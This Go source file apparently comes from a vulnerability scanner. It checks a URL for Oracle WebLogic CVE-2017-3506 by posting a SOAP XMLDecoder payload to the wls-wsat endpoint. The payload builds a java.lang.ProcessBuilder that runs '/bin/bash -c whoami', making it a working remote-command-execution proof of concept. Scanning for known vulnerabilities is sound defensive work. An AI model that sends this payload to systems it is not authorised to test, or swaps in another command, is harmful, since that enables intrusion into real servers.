package weblogic

import (
	"fmt"
	"github.com/hktalent/scan4all/pkg"
	"strings"
)

func CVE_2017_3506(url string) bool {
	post_str := `
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
				<void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
	`
	header := make(map[string]string)
	header["Content-Type"] = "text/xml;charset=UTF-8"
	header["SOAPAction"] = ""
	if req, err := pkg.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", post_str, false, header); err == nil {
		if (strings.Contains(req.Body, "<faultstring>java.lang.ProcessBuilder")) || (strings.Contains(req.Body, "<faultstring>0")) {
			pkg.GoPocLog(fmt.Sprintf("Found vuln Weblogic CVE_2017_3506|%s\n", url))
			return true
		}
	}
	return false
}
